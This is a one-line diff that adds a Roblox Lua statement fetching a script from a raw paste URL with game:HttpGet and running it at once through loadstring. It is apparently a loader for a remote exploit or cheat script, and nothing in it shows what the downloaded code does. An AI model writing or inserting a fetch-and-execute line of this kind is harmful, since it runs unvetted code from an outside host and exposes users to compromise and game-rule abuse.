@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://haste.powercord.dev/raw/fugareyago", true))()
